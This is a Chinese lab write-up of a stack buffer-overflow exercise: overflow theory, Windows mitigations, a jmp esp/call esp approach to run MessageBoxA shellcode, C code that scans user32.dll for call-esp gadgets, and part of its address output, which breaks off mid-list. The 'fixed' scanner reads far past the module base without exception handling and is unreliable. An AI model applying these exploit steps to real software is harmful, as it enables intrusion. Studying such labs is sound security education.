<h4 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h4><p>缓冲区溢出是一种常见的软件安全漏洞，它发生在程序处理输入数据时，没有正确检查数据的长度，导致数据超出了分配给该数据的内存空间，从而覆盖了相邻的内存区域。这种溢出可以破坏程序的正常执行流程，甚至允许攻击者执行任意代码。在实验中，我们将通过编写一个存在缓冲区溢出漏洞的程序，然后利用这个漏洞来执行我们控制的代码，例如弹出一个警告对话框。</p>
<p>缓冲区溢出漏洞的实验原理基于程序在处理输入数据时的缺陷。在C/C++程序中，如果使用如strcpy这样的函数来复制字符串到一个固定大小的缓冲区，而没有检查字符串的长度，那么当输入的字符串超过缓冲区的大小时，多余的数据就会溢出到相邻的内存区域。这个相邻的内存区域可能包含程序的返回地址，如果攻击者能够控制这个返回地址，就可以让程序执行攻击者指定的代码，这就是所谓的“控制流劫持”。</p>
<p>在实验中，我们会创建一个简单的程序，该程序包含一个易受攻击的函数，该函数会接收用户输入并将其复制到一个固定大小的缓冲区。然后，我们会构造一个特殊的输入字符串，使其长度超过缓冲区的大小，从而触发溢出。通过精心构造这个字符串，我们可以覆盖返回地址，使其指向我们准备的shellcode。当程序执行到返回指令时，它会跳转到shellcode的地址，执行我们注入的代码。</p>
<p>通过往程序的缓冲区写超出其长度的内容，造成缓冲区的溢出，从而破坏程序的堆栈，进而运行精心准备的指令，以达到攻击的目的。  </p>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/v2-1b6a999604597d4bdc536eb59c2955aa_b.jpg" class="">
<p>如上图，程序的缓冲区比作一个个格子（内存单元），每个格子中存放不同的东西，有的是命令，有的是数据，当程序需要接收用户数据，程序预先为之分配了4个格子（上图中黄色的0~3号格子）。</p>
<p>按照程序设计，就是要求用户输入的数据不超过4个。</p>
<p>而用户在输入数据时，假设输入了16个数据，而且程序也没有对用户输入数据的多少进行检查（这种情况太常见了，windows系统本身就出过n个缓冲区溢出漏洞），就往预先分配的格子中存放，这样不仅4个分配的格子(内存)被使用了，其后相邻的12个格子中的内容都被新数据覆盖。  </p>
<p>一般情况下后面的格子是可以被当成代码执行的，嘿嘿，那么好玩的事情来了，我们可以精心制造一段指令，比如格式化硬盘指令来让cpu执行。</p>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/v2-48df59365aad345eb680d0da0cc56ab3_b.jpg" class="">
<p>堆栈溢出是如何形成的？</p>
<p>简单来说，堆栈溢出就是把大缓冲区中的数据向小缓冲区中复制，由于没有关注小缓冲区的边界，“撑爆”了较小的缓冲区，从而冲掉了小缓冲区和邻内区域的其他数据而引起的内存问题。在具体描述堆栈溢出之前我们先来了解一下 Linux 程序在内存中的结构：</p>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240829030133682.png" class="" title="image-20240829030133682">
<p>其中共享区也称为 data 区，用来存储可执行代码；.text 和 .bss 均用来存储程序的全局变量和初始化变量；堆则不随函数消亡而消亡，而是直到程序消亡或手动释放才会消亡；堆栈是随着函数分配并消亡的，堆栈溢出就是出现在堆栈区中的缓冲区安全问题。 </p>
<p>堆栈是一个后进先出（LIFO）数据结构，往低地址增长，它保存本地变量、函数调用等信息。随着函数调用层数的增加，栈帧会向低地址方向延伸；随着进程中函数调用层数的减少，即各函数的返回，栈帧会一块一块地被遗弃而向内存的高地址方向回缩。各函数的栈帧大小随着函数的性质不同而不等。 </p>
<p>堆栈这种数据结构，常见操作有压栈（PUSH）、弹栈（POP）；用于标识栈的属性有：栈顶（TOP）、栈底（BASE）。 </p>
<p>其中：</p>
<p>◈ PUSH：为栈增加一个元素的操作叫做 PUSH，相当于插入一块；</p>
<p>◈ POP：从栈中取出一个元素的操作叫做 POP；</p>
<p>◈ TOP：TOP 标识栈顶的位置，且是动态变化的，每做一次 PUSH 操作，它会自 +1；每做一次 POP 操作，它会自 -1；</p>
<p>◈ BASE：BASE 标识栈底位置，用于防止栈空后继续弹栈，一般来说BASE位置不发生改变。</p>
<p>下面以 main 函数叠加 A 和 B 函数为例说明整个压栈和弹栈过程：</p>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240829030045795.png" class="" title="image-20240829030045795">
<p>Main 函数调用 A 函数，把 A 函数中的变量添加到堆栈区内，开辟大小和变量指定大小相关。同样 B 函数在被调用后也会把变量添加到堆栈区内，开辟指定大小空间给 B 区域变量使用。</p>
<p>◈如果其中任意一个变量存入的值超过设计的界定，就会导致值覆盖其他变量的区域最终污染到函数返回地址区域。一旦函数的返回地址被污染，在进行弹栈的过程中会最终把跳转的地址指向黑客所指定的区域，或根本不存在的区域。</p>
<p>◈如果覆盖函数返回地址的是一组随机值，则程序会跳转到未知位置，这种情况往往最终会导致整个程序崩溃。</p>
<p>◈如果黑客构造足够精细的 shellcode，把跳转地址指向黑客自己注入的代码，则很可能会利用该漏洞获得当前用户的控制权限。</p>
<h4 id="实验概述"><a href="#实验概述" class="headerlink" title="实验概述"></a>实验概述</h4><ul>
<li><strong>实验目的</strong>：通过模拟缓冲区溢出攻击，理解其原理，掌握利用方法。</li>
<li><strong>实验要求</strong>：编写程序实现缓冲区溢出，执行特定功能（如弹出MessageBox警告框）。</li>
<li><strong>实验原理</strong>：利用程序在处理输入时未正确检查缓冲区大小，导致数据溢出到相邻内存区域，覆盖关键数据（如返回地址），从而控制程序流程。</li>
</ul>
<h4 id="实验中可能出现的问题"><a href="#实验中可能出现的问题" class="headerlink" title="实验中可能出现的问题"></a>实验中可能出现的问题</h4><ol>
<li><p><strong>编译器优化</strong>：某些编译器可能会对代码进行优化，这可能会改变程序的内存布局，使得溢出攻击更加困难。例如，编译器可能会将局部变量移动到堆上，或者在编译时自动插入安全检查。</p>
</li>
<li><p><strong>栈保护机制</strong>：现代操作系统和编译器可能会启用栈保护机制，如StackGuard或ProPolice，这些机制会检测并阻止栈溢出。</p>
</li>
<li><p><strong>地址随机化</strong>：地址空间布局随机化（ASLR）会随机化程序和库在内存中的位置，使得预测shellcode的执行地址变得困难。</p>
</li>
<li><p><strong>数据执行保护</strong>：数据执行保护（DEP）会标记某些内存区域为不可执行，阻止攻击者执行注入的代码。</p>
</li>
<li><p><strong>调试器干扰</strong>：在调试过程中，调试器可能会改变程序的执行行为，例如通过断点或单步执行，这可能会影响溢出攻击的成功率。</p>
</li>
<li><p><strong>shellcode兼容性</strong>：编写的shellcode需要与目标系统的架构（如x86或x64）兼容，并且需要考虑到目标系统上的特定API函数地址。</p>
</li>
<li><p><strong>错误处理</strong>：程序可能会有错误处理逻辑，如异常处理，这可能会在溢出发生时执行，从而影响攻击的执行流程。</p>
</li>
<li><p><strong>环境差异</strong>：不同的操作系统版本、编译器版本和系统配置可能会导致实验结果不一致。</p>
</li>
</ol>
<p>为了成功完成实验，实验者需要对上述问题有所了解，并在实验设计中考虑到这些潜在的障碍。通过实验，实验者将能够更深入地理解缓冲区溢出的原理，并学会如何识别和利用这类漏洞。</p>
<h3 id="二、实训流程及分析"><a href="#二、实训流程及分析" class="headerlink" title="二、实训流程及分析"></a>二、实训流程及分析</h3><p><strong>关键步骤</strong></p>
<ol>
<li><strong>精确定位返回地址的位置</strong>：通过调试工具分析程序执行过程中的堆栈变化，确定函数返回地址在堆栈中的具体位置。</li>
<li><strong>寻找合适的地址覆盖原始地址</strong>：使用动态链接库（如user32.dll）中的跳转指令（如jmp esp）来找到一个合适的地址，以便将控制流引导到我们的shellcode。</li>
<li><strong>编写shellcode到相应的缓冲区中</strong>：编写shellcode并将其放置在合适的内存位置，以便在覆盖后的地址执行。</li>
</ol>
<p>特别说明：在本实训中，我们将攻击代码（即MessageBox弹窗警告）直接写在jmp esp或call esp地址后面。这是因为jmp esp指令会跳转到栈指针（ESP）指向的地址执行代码，而我们的shellcode正好位于这个位置。这种方法可以确保在栈溢出时，执行流被重定向到我们控制的代码区域。</p>
<p><strong>精确定位返回地址</strong></p>
<ol>
<li><p><strong>编译模式对比</strong>：首先，我们对比了不同编译模式下的栈空间分配。在debug模式下，编译器会为数组预留更多的空间，这可能会影响返回地址的定位。通过使用OllyDbg，我们观察了不同编译模式下返回地址的位置，以确保我们能够准确定位到目标地址。</p>
</li>
<li><p><strong>调试程序源码分析</strong>：我们编写了一个简单的调试程序，使用32bit-debug模式编译。通过观察程序执行后返回地址的内容，我们确定了返回地址的确切位置。</p>
</li>
<li><p><strong>ESP和EBP的入栈</strong>：在程序执行过程中，我们观察到ESP和EBP的值会入栈。这为我们提供了一个参考点，以便在后续步骤中确定正确的地址。</p>
</li>
</ol>
<p><strong>寻找合适的跳转地址</strong></p>
<ol>
<li><p><strong>jmp esp(call esp)的利用</strong>：我们利用了jmp esp(call esp)指令的特性，这种指令允许程序跳转到ESP寄存器指向的地址。通过搜索kernel32.dll，我们找到了一些call esp的地址，这些地址可以被用来实现跳转。</p>
</li>
<li><p><strong>user32.dll的加载</strong>：由于MessageBoxA函数需要user32.dll动态链接库，我们必须确保主程序加载了这个库。否则，MessageBoxA调用将失败。</p>
</li>
</ol>
<p><strong>编写shellcode并执行</strong></p>
<ol>
<li><p><strong>shellcode编写</strong>：我们编写了一个简单的shellcode，其目的是调用MessageBoxA函数来弹出警告框。这个shellcode需要被放置在程序的缓冲区中，以便在溢出时执行。</p>
</li>
<li><p><strong>攻击代码的放置</strong>：我们将shellcode直接写在jmp esp或者call esp地址后面，这样做的原因是，一旦jmp esp或call esp指令被执行，程序的控制流将跳转到ESP寄存器指向的地址，即我们的shellcode。这样，我们就可以控制程序执行我们想要的代码，而不是返回到原始的返回地址。</p>
</li>
<li><p><strong>程序执行</strong>：在程序执行过程中，我们通过溢出输入，覆盖了返回地址，使其指向我们的shellcode。当程序执行到返回指令时，它将跳转到shellcode，执行我们定义的操作（弹出MessageBoxA）。</p>
</li>
</ol>
<p><strong>遇到的问题</strong></p>
<ol>
<li><p><strong>编译器的嵌套堆栈保护</strong>：在某些编译器版本中，如Dev-C++ 5.11，存在嵌套堆栈的保护机制。这会使得溢出后无法直接返回到我们想要的地址。为了解决这个问题，我们采用了几种方法：预留出足够的空间来覆盖嵌套堆栈，直接在动态调试器中修改汇编指令，或者更换编译器版本。</p>
</li>
<li><p><strong>调试器报错</strong>：在使用Dev-C++ 5.11编译时，我们在“__try”处遇到了报错。这提示我们需要更换编译器，或者使用其他等价的函数来避免错误。</p>
</li>
<li><p><strong>动态链接库的加载问题</strong>：在未正确加载user32.dll的情况下，MessageBoxA调用会失败。这要求我们在编写shellcode之前确保所有必要的动态链接库都被正确加载。</p>
</li>
</ol>
<p>通过这些步骤和对问题的解决，我们成功地实现了缓冲区溢出攻击，并且弹出了MessageBoxA警告框。这个过程不仅加深了我们对缓冲区溢出原理的理解，也提高了我们在实际环境中识别和利用此类漏洞的能力。</p>
<p><strong>具体操作</strong></p>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141647865.png" class="" title="image-20240131141647865">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141659202.png" class="" title="image-20240131141659202">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141706938.png" class="" title="image-20240131141706938">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141713797.png" class="" title="image-20240131141713797">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141723487.png" class="" title="image-20240131141723487">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141733407.png" class="" title="image-20240131141733407">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141740142.png" class="" title="image-20240131141740142">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141752071.png" class="" title="image-20240131141752071">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141800874.png" class="" title="image-20240131141800874">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141808492.png" class="" title="image-20240131141808492">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141816283.png" class="" title="image-20240131141816283">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141825548.png" class="" title="image-20240131141825548">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141833223.png" class="" title="image-20240131141833223">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141841368.png" class="" title="image-20240131141841368">
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user32=<span class="number">0x763f0000</span></span><br><span class="line">ExitProcess= <span class="number">0x764174d0</span>                                                                                 </span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141851414.png" class="" title="image-20240131141851414">
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user32=<span class="number">0x75880000</span>                                                                                         MessageBoxA= <span class="number">0x758fa110</span></span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141859074.png" class="" title="image-20240131141859074">
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HINSTANCE hHandle = <span class="built_in">LoadLibrary</span>(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!hHandle)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;LoadLibrary Error!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	BYTE* ptr =(BYTE*)hHandle;</span><br><span class="line">	<span class="type">int</span> address;</span><br><span class="line">	BOOL done_Flag=<span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;!done_Flag;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">		__try</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (ptr[i] == <span class="number">0xFF</span> &amp;&amp; ptr[i + <span class="number">1</span>] == <span class="number">0xD4</span>)  <span class="comment">//jmp esp FFE4 ;  call esp FFD4</span></span><br><span class="line">				&#123;</span><br><span class="line">					address = (<span class="type">int</span>)ptr+i;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;OPCODE found at 0x%x\n&quot;</span>,address);</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line">		__except (EXCEPTION_EXECUTE_HANDLER)&#123;&#125;</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//	address = (int)ptr+i;</span></span><br><span class="line">			<span class="comment">//	printf(&quot;OPCODE found at 0x%x\n&quot;,address);</span></span><br><span class="line">			<span class="comment">//	done_Flag=true;</span></span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76077be7</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76078cad</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76078cb9</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76079d7f</span></span><br><span class="line"><span class="comment">OPCODE found at 0x7607ad25</span></span><br><span class="line"><span class="comment">OPCODE found at 0x7607dea7</span></span><br><span class="line"><span class="comment">OPCODE found at 0x7607dffb</span></span><br><span class="line"><span class="comment">OPCODE found at 0x7607e00b</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76080be5</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76080be9</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76080ff9</span></span><br><span class="line"><span class="comment">OPCODE found at 0x760812d1</span></span><br><span class="line"><span class="comment">OPCODE found at 0x760823a3</span></span><br><span class="line"><span class="comment">OPCODE found at 0x7608345d</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76083e2b</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76084523</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76084ef9</span></span><br><span class="line"><span class="comment">OPCODE found at 0x760855e9</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"></span><br><span class="line">D:/文件/大学/实训/缓冲区溢出/SearchJmpEsp.cpp	<span class="number">0</span>	<span class="number">-1</span>	In function <span class="string">&#x27;int main()&#x27;</span>:</span><br><span class="line">D:/文件/大学/实训/缓冲区溢出/SearchJmpEsp.cpp	<span class="number">18</span>	<span class="number">17</span>	[错误] <span class="string">&#x27;__try&#x27;</span> was <span class="keyword">not</span> declared in <span class="keyword">this</span> scope</span><br><span class="line">D:/文件/大学/实训/缓冲区溢出/SearchJmpEsp.cpp	<span class="number">28</span>	<span class="number">17</span>	[错误] <span class="string">&#x27;__except&#x27;</span> was <span class="keyword">not</span> declared in <span class="keyword">this</span> scope</span><br><span class="line">D:/文件/大学/实训/缓冲区溢出/SearchJmpEsp.cpp	<span class="number">12</span>	<span class="number">15</span>	[警告] unused variable <span class="string">&#x27;ptr&#x27;</span> [-Wunused-variable]</span><br><span class="line">D:/文件/大学/实训/缓冲区溢出/SearchJmpEsp.cpp	<span class="number">13</span>	<span class="number">13</span>	[警告] unused variable <span class="string">&#x27;address&#x27;</span> [-Wunused-variable]</span><br></pre></td></tr></table></figure>
<p>原程序遇到的编译错误和警告表明有几个问题需要解决：</p>
<ol>
<li><p><strong><code>__try</code> 和 <code>__except</code> 未声明</strong>：这些是 Microsoft 特有的结构化异常处理（SEH）关键字，仅在特定的编译器（如 MSVC）中可用。如果您在 DevC++ 或其他非 MSVC 编译器中编译此代码，这些关键字将不可用。</p>
</li>
<li><p><strong>未使用的变量</strong>：警告表明 <code>ptr</code> 和 <code>address</code> 变量被声明但未使用。这可能是因为代码中有逻辑错误或不完整的实现。</p>
</li>
</ol>
<p>要修复这些问题，我们可以做如下修改：</p>
<ul>
<li>替换 <code>__try</code> 和 <code>__except</code> 为标准的 C++ 异常处理，如果需要的话。但是，由于您的目的是扫描内存，可能不需要异常处理。</li>
<li>确保所有声明的变量都被正确使用。</li>
</ul>
<p>以下是修改后的代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    HINSTANCE hHandle = LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hHandle) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;LoadLibrary Error!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BYTE* ptr = (BYTE*)hHandle;</span><br><span class="line">    <span class="type">uintptr_t</span> address;  <span class="comment">// 使用 uintptr_t 以兼容 64 位系统</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uintptr_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000000</span>; i++) &#123; <span class="comment">// 假定扫描的最大范围</span></span><br><span class="line">        <span class="keyword">if</span> (ptr[i] == <span class="number">0xFF</span> &amp;&amp; ptr[i + <span class="number">1</span>] == <span class="number">0xD4</span>) &#123;</span><br><span class="line">            address = (<span class="type">uintptr_t</span>)ptr + i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;OPCODE found at 0x%p\n&quot;</span>, (<span class="type">void</span>*)address);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码在 <code>user32.dll</code> 中搜索特定的机器码（<code>0xFF</code> 和 <code>0xD4</code>），并打印出找到的每个地址。请记住，直接访问系统库的内存可能导致不稳定的行为，因此请小心使用。此外，这段代码可能需要在具有管理员权限的环境中运行，以获取对系统库的访问权限。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><span class="line">OPCODE found at 0x75940FBF</span><br><span class="line">OPCODE found at 0x75940FC3</span><br><span class="line">OPCODE found at 0x75940FC7</span><br><span class="line">OPCODE found at 0x75941013</span><br><span class="line">OPCODE found at 0x759410EF</span><br><span class="line">OPCODE found at 0x7594117B</span><br><span class="line">OPCODE found at 0x7594127F</span><br><span class="line">OPCODE found at 0x75941383</span><br><span class="line">OPCODE found at 0x75941CA7</span><br><span class="line">OPCODE found at 0x75941DA7</span><br><span class="line">OPCODE found at 0x75941E1B</span><br><span class="line">OPCODE found at 